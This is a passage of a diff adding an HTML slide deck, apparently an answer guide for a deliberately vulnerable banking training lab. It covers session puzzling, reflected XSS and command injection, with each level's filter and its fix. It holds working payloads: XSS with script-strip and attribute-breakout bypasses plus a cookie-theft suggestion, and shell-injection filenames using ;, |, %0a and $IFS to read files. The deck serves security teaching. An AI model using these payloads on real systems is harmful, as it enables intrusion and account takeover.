+          <div class="fixbox"><b>L3 — secure:</b> changing the Customer ID at step 1 clears <code>recovery_stage</code>, and the reset gate requires the stage to have been earned by the same user — <code>recovery_stage_uid === recovery_uid</code>. The swap is refused.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">L25</span>
+            <span class="slh-lvl l0">L0 &mdash; Auth-key overload</span>
+            <span class="slh-ttl">Session Puzzling (Forgot-Password)</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Step 1 writes <code>$_SESSION['user']</code> — the <b>same key the authenticated area trusts</b> — for whatever Customer ID you type, before any OTP or security questions.</p>
+            <div class="lab">How to solve it</div><p>Submit the victim's Customer ID, then just browse to the app. You're already “logged in” as them.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">/forgot-password (victim's ID)  →  /dashboard</div><div class="paynote">watch /debug/session to see it</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">L25</span>
+            <span class="slh-lvl l1">L1 / L2 &mdash; Stage carryover (same technique both levels)</span>
+            <span class="slh-ttl">Session Puzzling (Forgot-Password)</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Progress (<code>recovery_stage</code>) is tracked <b>separately</b> from the target (<code>recovery_uid</code>) and isn't bound to it. <i>(L2 currently mirrors L1 — a distinct binding is still to be differentiated.)</i></p>
+            <div class="lab">How to solve it</div><p>Earn the stage on your own account, then swap the target underneath it.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">complete flow for yourself → reach reset (stage=2) → new tab: submit victim's ID (overwrites recovery_uid, keeps stage) → drive /forgot-password/reset</div><div class="paynote">you reset the victim's password</div></div>
+            
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">G4</div>
+        <div>
+          <div class="ovcwe">CWE-79 · A03:2021  ·  🎓 training only (no flag)</div>
+          <h2 class="ovtitle">Reflected XSS</h2>
+          <div class="ovwhere">📍 /statements — search term reflection</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Run attacker JavaScript in the victim's browser via a reflected value.</p>
+          <div class="lab">Root cause</div><p>The search term is reflected back into the page <b>without encoding</b>, so markup you send becomes part of the page and executes. Which encoding is missing depends on <b>where</b> it's reflected — text vs. an HTML attribute.</p>
+          <div class="note"><b>Note.</b> Not part of the CTF (<code>ctf_eligible=false</code>) — no flag. At L0 the session cookie has <b>no HttpOnly</b>, so <code>document.cookie</code> includes it — use that to demo cookie theft.</div>
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">reflected raw into text</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">naive &lt;script&gt; strip — use handlers/nesting</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">text encoded, attribute raw — break out</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">both contexts encoded</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> <code>htmlspecialchars()</code> on <b>both</b> the text and the attribute reflections; the payload can't break out of either context, so nothing executes.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">G4</span>
+            <span class="slh-lvl l0">L0 &mdash; Raw reflection into text</span>
+            <span class="slh-ttl">Reflected XSS</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The term is echoed straight into the “Results for:” line, unencoded.</p>
+            <div class="lab">How to solve it</div><p>Any tag runs. Use an image error handler (fires without a visible element).</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">&lt;img src=x onerror=alert(document.domain)&gt;</div><div class="paynote">&lt;script&gt;alert(1)&lt;/script&gt; also works</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">G4</span>
+            <span class="slh-lvl l1">L1 &mdash; Naive &lt;script&gt; strip</span>
+            <span class="slh-ttl">Reflected XSS</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>A single-pass strip removes literal <code>&lt;script&gt;</code>/<code>&lt;/script&gt;</code>, so a plain script tag never fires.</p>
+            <div class="lab">How to solve it</div><p>Don't use a script tag — use an event handler, or nest the tag so one strip rebuilds it.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">&lt;img src=x onerror=alert(1)&gt;   ·   &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</div><div class="paynote">event handler needs no &lt;script&gt;</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">G4</span>
+            <span class="slh-lvl l2">L2 &mdash; Text encoded, attribute raw</span>
+            <span class="slh-ttl">Reflected XSS</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p><code>&lt;&gt;</code> are now encoded in the <b>text</b> sink — but the search box <code>value="…"</code> reflects your input <b>raw</b>. The text payload is inert here; the attribute is the vector.</p>
+            <div class="lab">How to solve it</div><p>Break out of the attribute first with <code>"&gt;</code>, then inject your tag.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">"&gt;&lt;img src=x onerror=alert(1)&gt;</div><div class="paynote">close the value=" then add markup</div></div>
+            
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">G9</div>
+        <div>
+          <div class="ovcwe">CWE-78 · A03:2021</div>
+          <h2 class="ovtitle">Command Injection</h2>
+          <div class="ovwhere">📍 /statements — Download PDF</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Run OS commands as <code>www-data</code> (RCE) and read the flag file.</p>
+          <div class="lab">Root cause</div><p>The Download-PDF control shells out to <code>wkhtmltopdf</code> with your <b>output filename unescaped</b>. Shell metacharacters in the filename start new commands. <i>(Runs in an emulated honeypot shell — no real host access, no egress.)</i></p>
+          <div class="note"><b>Note.</b> The flag file is per-user: <code>/tmp/flag_g9_&lt;id&gt;.txt</code>. <code>id</code> → uid=33(www-data); <code>ls /tmp</code> finds the filename.</div>
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">raw — ';' chains commands</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">blacklist ; & — use the pipe</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">blacklist ; & | + spaces — newline + $IFS</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">escapeshellarg() on every arg</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> <code>escapeshellarg()</code> wraps every argument, so <code>;</code>, <code>|</code>, newline and <code>$IFS</code> are all treated as literal filename characters — a real PDF is returned and nothing breaks out.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">G9</span>
+            <span class="slh-lvl l0">L0 &mdash; Raw — semicolon chaining</span>
+            <span class="slh-ttl">Command Injection</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Nothing filtered; the filename goes straight to the shell.</p>
+            <div class="lab">How to solve it</div><p>Chain commands with <code>;</code>.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">filename=statement.pdf;cat /tmp/flag_g9_&lt;id&gt;.txt;</div><div class="paynote">prove RCE first with ;id;</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">G9</span>
+            <span class="slh-lvl l1">L1 &mdash; Blacklist: ; &amp;</span>
+            <span class="slh-ttl">Command Injection</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The filter strips <code>;</code> and <code>&amp;</code>, so <code>statement.pdf;cat…</code> collapses into one broken token.</p>
+            <div class="lab">How to solve it</div><p>Use a separator the blacklist forgot — the pipe survives.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">filename=statement.pdf|cat /tmp/flag_g9_&lt;id&gt;.txt</div><div class="paynote">| was not on the list</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">G9</span>
+            <span class="slh-lvl l2">L2 &mdash; Blacklist: ; &amp; | + spaces</span>
+            <span class="slh-ttl">Command Injection</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Now <code>;</code>, <code>&amp;</code>, <code>|</code> and <b>spaces</b> are all stripped — the pipe is gone and no space survives.</p>
+            <div class="lab">How to solve it</div><p>Separate commands with a raw <b>newline</b> (<code>%0a</code>) and make a space without typing one, using <code>$IFS</code>.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">filename=statement.pdf%0acat$IFS/tmp/flag_g9_&lt;id&gt;.txt</div><div class="paynote">also ${IFS}, $IFS$9, %09, {cat,/path}</div></div>
+            
+          </div></section>
+</div>
+<div class="bar">
+  <div class="prog" id="prog"></div>
+  <div class="nav"><button onclick="go(cur-1)">←</button><button onclick="go(cur+1)">→</button>
+    <button onclick="toggleMenu()">☰ Menu</button></div>
+  <div class="where" id="where"></div>
+  <div class="count" id="count"></div>
+</div>
+<div id="menu"><h3>Jump to a vulnerability</h3><div class="grid"><button data-go="2"><b>G1</b> SQL Injection — Login Bypass</button><button data-go="6"><b>L11</b> OTP in Response Body</button><button data-go="10"><b>L12</b> JWT Forgery → Admin</button><button data-go="14"><b>L1</b> IDOR — Transfer From Another Account</button><button data-go="18"><b>G2</b> SQL Injection — Data Extraction</button><button data-go="22"><b>L25</b> Session Puzzling (Forgot-Password)</button><button data-go="25"><b>G4</b> Reflected XSS</button><button data-go="29"><b>G9</b> Command Injection</button></div>
+  <div class="grid" style="margin-top:1rem"><button data-go="0"><b>▸</b> Title</button>
+  <button data-go="1"><b>▸</b> The 8 vulnerabilities</button></div></div>
+<script>
+const slides=[...document.querySelectorAll('.slide')];let cur=0;
+const names={"2": "G1 \u2014 SQL Injection \u2014 Login Bypass", "6": "L11 \u2014 OTP in Response Body", "10": "L12 \u2014 JWT Forgery \u2192 Admin", "14": "L1 \u2014 IDOR \u2014 Transfer From Another Account", "18": "G2 \u2014 SQL Injection \u2014 Data Extraction", "22": "L25 \u2014 Session Puzzling (Forgot-Password)", "25": "G4 \u2014 Reflected XSS", "29": "G9 \u2014 Command Injection"};
+function label(i){if(i===0)return'Title';if(i===1)return'Agenda';
+  let keys=Object.keys(names).map(Number).sort((a,b)=>a-b);let last='';
+  for(const k of keys){if(k<=i)last=names[k];}return last;}
+function go(i){i=Math.max(0,Math.min(slides.length-1,i));
+  slides[cur].classList.remove('on');cur=i;slides[cur].classList.add('on');
+  slides[cur].scrollTop=0;
+  document.getElementById('count').textContent=(i+1)+' / '+slides.length;
+  document.getElementById('where').textContent=label(i);
+  document.getElementById('prog').style.width=((i)/(slides.length-1)*100)+'%';
+  location.hash=i;}
+function toggleMenu(){document.getElementById('menu').classList.toggle('on');}
+document.getElementById('menu').addEventListener('click',e=>{const b=e.target.closest('button');
+  if(b&&b.dataset.go!=null){go(+b.dataset.go);toggleMenu();}});
+addEventListener('keydown',e=>{
+  if(e.key==='ArrowRight'||e.key==='PageDown'||e.key===' '){go(cur+1);e.preventDefault();}
+  else if(e.key==='ArrowLeft'||e.key==='PageUp'){go(cur-1);}
+  else if(e.key==='Home'){go(0);}else if(e.key==='End'){go(slides.length-1);}
+  else if(e.key.toLowerCase()==='m'){toggleMenu();}
+  else if(e.key==='Escape'){document.getElementById('menu').classList.remove('on');}});
+slides[0].classList.add('on');go(location.hash?+location.hash.slice(1)||0:0);
+</script></body></html>
